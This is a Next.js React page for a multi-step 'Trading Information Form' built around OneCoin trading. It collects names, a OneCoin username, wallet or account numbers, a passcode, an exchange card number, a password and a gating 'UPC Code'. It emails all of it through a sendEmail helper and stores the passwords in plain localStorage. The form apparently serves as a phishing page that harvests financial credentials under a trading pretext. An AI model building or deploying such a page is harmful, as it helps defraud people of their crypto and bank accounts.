"use client";

import React, { useState, useEffect, ChangeEvent, FormEvent } from "react";
import { useRouter } from "next/navigation";
import { motion } from "framer-motion";
import CrystalBackground from "@/components/CrystalBackground";
import Navbar from "@/components/Navbar";
import { sendEmail, FormData } from "@/app/lib/email";
import { FaEye, FaEyeSlash } from "react-icons/fa";

const initialFormData: FormData = {
  surname: "",
  firstName: "",
  otherName: "",
  maritalStatus: "",
  location: "",
  onecoinUsername: "",
  amountToTrade: "",
  cryptocurrency: "",
  bankTransfer: "",
  walletAddress: "",
  passcode: "",
  exchangeCardNumber: "",
  password: "",
  confirmPassword: "",
  upcCode: "",
  passphrase: "",
  confirmPassphrase: "",
};

export default function FormPage() {
  const router = useRouter();
  const [formData, setFormData] = useState<FormData>(initialFormData);
  const [error, setError] = useState<string>("");
  const [currentPage, setCurrentPage] = useState<number>(1);
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState<boolean>(false);

  // Load form data from localStorage on mount.
  useEffect(() => {
    const savedData = localStorage.getItem("tradingFormData");
    if (savedData) {
      setFormData(JSON.parse(savedData));
    }
  }, []);

  // Save form data to localStorage whenever it changes.
  useEffect(() => {
    localStorage.setItem("tradingFormData", JSON.stringify(formData));
  }, [formData]);

  const handleChange = (
    e: ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;
  
    // Check for UPC Code validity during the input change
    if (name === 'upcCode' && value !== "1234567890") {
      setError("Invalid UPC Code");
    } else {
      setError("");  // Clear error if valid
    }
  
    setFormData((prev) => ({ ...prev, [name]: value }));
  };
  

  // Handle final submission
  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const validUPCCode = "1234567890";
    if (formData.upcCode !== validUPCCode) {
      setError("Invalid UPC Code");
      return;
    }
    const emailSent = await sendEmail(formData);
    if (emailSent) {
      console.log("Form Data Submitted and emailed:", formData);
      localStorage.removeItem("tradingFormData");
      router.push("/Remitter");
    } else {
      setError("Error sending email. Please try again.");
    }
  };

  const fadeVariants = {
    hidden: { opacity: 0 },
    visible: { opacity: 1, transition: { duration: 0.6 } },
  };

  const renderPage = () => {
    switch (currentPage) {
      case 1:
        return (
          <motion.div
            key="page1"
            initial="hidden"
            animate="visible"
            variants={fadeVariants}
          >
            <h2 className="text-2xl font-semibold text-gold mb-4">
              Personal Details
            </h2>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gold">
                  Surname
                </label>
                <input
                  type="text"
                  name="surname"
                  value={formData.surname}
                  onChange={handleChange}
                  className="w-full p-2 border border-gray-300 rounded"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gold">
                  First Name
                </label>
                <input
                  type="text"
                  name="firstName"
                  value={formData.firstName}
                  onChange={handleChange}
                  className="w-full p-2 border border-gray-300 rounded"
                  required
                />
              </div>
            </div>
            <div className="mt-4">
              <label className="block text-sm font-medium text-gold">
                Other Name
              </label>
              <input
                type="text"
                name="otherName"
                value={formData.otherName}
                onChange={handleChange}
                className="w-full p-2 border border-gray-300 rounded"
              />
            </div>
            <div className="mt-4">
              <label className="block text-sm font-medium text-gold">
                Marital Status
              </label>
              <select
                name="maritalStatus"
                value={formData.maritalStatus}
                onChange={handleChange}
                className="w-full p-2 border border-gray-300 rounded"
                required
              >
                <option value="">Select Marital Status</option>
                <option value="Single">Single</option>
                <option value="Married">Married</option>
                <option value="Divorced">Divorced</option>
                <option value="Widowed">Widowed</option>
                <option value="Separated">Separated</option>
              </select>
            </div>
          </motion.div>
        );
      case 2:
        return (
          <motion.div
            key="page2"
            initial="hidden"
            animate="visible"
            variants={fadeVariants}
          >
            <h2 className="text-2xl font-semibold text-gold mb-4">
              Trading Information
            </h2>
            <div className="mt-4">
              <label className="block text-sm font-medium text-gold">
                Location
              </label>
              <input
                type="text"
                name="location"
                value={formData.location}
                onChange={handleChange}
                className="w-full p-2 border border-gray-300 rounded"
                required
              />
            </div>
            <div className="mt-4">
              <label className="block text-sm font-medium text-gold">
                Valid OneCoin Username
              </label>
              <input
                type="text"
                name="onecoinUsername"
                value={formData.onecoinUsername}
                onChange={handleChange}
                className="w-full p-2 border border-gray-300 rounded"
                required
              />
            </div>
            <div className="mt-4">
              <label className="block text-sm font-medium text-gold">
                Amount of OneCoins to Trade
              </label>
              <input
                type="number"
                name="amountToTrade"
                value={formData.amountToTrade}
                onChange={handleChange}
                className="w-full p-2 border border-gray-300 rounded"
                required
              />
            </div>
            <div className="mt-4">
              <label className="block text-sm font-medium text-gold">
                Select Your Favorite Cryptocurrency
              </label>
              <select
                name="cryptocurrency"
                value={formData.cryptocurrency}
                onChange={handleChange}
                className="w-full p-2 border border-gray-300 rounded"
                required
              >
                <option value="">Select a Cryptocurrency</option>
                <option value="BTC">BTC</option>
                <option value="USDT TRC20">USDT TRC20</option>
                <option value="USDT ERC20">USDT ERC20</option>
                <option value="USDT BNB">USDT BNB</option>
                <option value="TRX">TRX</option>
                <option value="ETH">ETH</option>
                <option value="BNB">BNB</option>
                <option value="POL">POL</option>
                <option value="TWT">TWT</option>
              </select>
            </div>
          </motion.div>
        );
      case 3:
        return (
          <motion.div
            key="page3"
            initial="hidden"
            animate="visible"
            variants={fadeVariants}
          >
            <h2 className="text-2xl font-semibold text-gold mb-4">
              Payment & Security
            </h2>
            <div className="mt-4">
              <label className="block text-sm font-medium text-gold">
                Bank Transfer
              </label>
              <input
                type="text"
                name="bankTransfer"
                value={formData.bankTransfer}
                onChange={handleChange}
                className="w-full p-2 border border-gray-300 rounded"
              />
            </div>
            <div className="mt-4">
              <label className="block text-sm font-medium text-gold">
                Wallet Address/Account Number
              </label>
              <input
                type="text"
                name="walletAddress"
                value={formData.walletAddress}
                onChange={handleChange}
                className="w-full p-2 border border-gray-300 rounded"
              />
            </div>
            <div className="mt-4">
              <label className="block text-sm font-medium text-gold">
                Passcode
              </label>
              <input
                type="text"
                name="passcode"
                value={formData.passcode}
                onChange={handleChange}
                className="w-full p-2 border border-gray-300 rounded"
              />
            </div>
            <div className="mt-4">
              <label className="block text-sm font-medium text-gold">
                Exchange Card Number
              </label>
              <input
                type="text"
                name="exchangeCardNumber"
                value={formData.exchangeCardNumber}
                onChange={handleChange}
                className="w-full p-2 border border-gray-300 rounded"
              />
            </div>
            <div className="mt-4 grid grid-cols-2 gap-4">
              <div className="relative">
                <label className="block text-sm font-medium text-gold">
                  Password
                </label>
                <input
                  type={showPassword ? "text" : "password"}
                  name="password"
                  value={formData.password}
                  onChange={handleChange}
                  className="w-full p-2 border border-gray-300 rounded pr-10"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute top-9 right-3 text-gray-500"
                >
                  {showPassword ? <FaEyeSlash /> : <FaEye />}
                </button>
              </div>
              <div className="relative">
                <label className="block text-sm font-medium text-gold">
                  Confirm Password
                </label>
                <input
                  type={showConfirmPassword ? "text" : "password"}
                  name="confirmPassword"
                  value={formData.confirmPassword}
                  onChange={handleChange}
                  className="w-full p-2 border border-gray-300 rounded pr-10"
                />
                <button
                  type="button"
                  onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                  className="absolute top-9 right-3 text-gray-500"
                >
                  {showConfirmPassword ? <FaEyeSlash /> : <FaEye />}
                </button>
              </div>
            </div>
            <div className="mt-4">
              <label className="block text-sm font-medium text-gold">
                UPC Code
              </label>
              <input
                type="text"
                name="upcCode"
                value={formData.upcCode}
                onChange={handleChange}
                className="w-full p-2 border border-gray-300 rounded"
                required
              />
            </div>
          </motion.div>
        );
      default:
        return null;
    }
  };

  const renderPagination = () => (
    <div className="flex justify-between mt-8">
      <button
        type="button"
        onClick={() => setCurrentPage((prev) => Math.max(prev - 1, 1))}
        disabled={currentPage === 1}
        className="px-4 py-2 bg-gray-700 text-white rounded disabled:opacity-50"
      >
        Previous
      </button>
      {currentPage < 3 ? (
        <button
          type="button"
          onClick={() => setCurrentPage((prev) => prev + 1)}
          className="px-4 py-2 bg-gray-700 text-white rounded"
        >
          Next
        </button>
      ) : (
        <button
          type="submit"
          form="multiStepForm"
          className="px-4 py-2 bg-gold text-black rounded"
        >
          Submit
        </button>
      )}
    </div>
  );

  return (
    <div className="relative min-h-screen bg-black mt-[4.5rem]">
      <Navbar />
      {/* Background Animation: absolute full-screen with a low z-index */}
      <div className="absolute inset-0 z-0 pointer-events-none">
        <CrystalBackground />
      </div>
      <div className="relative z-10 max-w-2xl mx-auto p-4">
        <h1 className="text-3xl font-bold text-center mb-6 text-gold">
          Trading Information Form
        </h1>
        {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
        <form
          id="multiStepForm"
          onSubmit={handleSubmit}
          className="space-y-6"
        >
          {renderPage()}
          {renderPagination()}
        </form>
      </div>
    </div>
  );
}
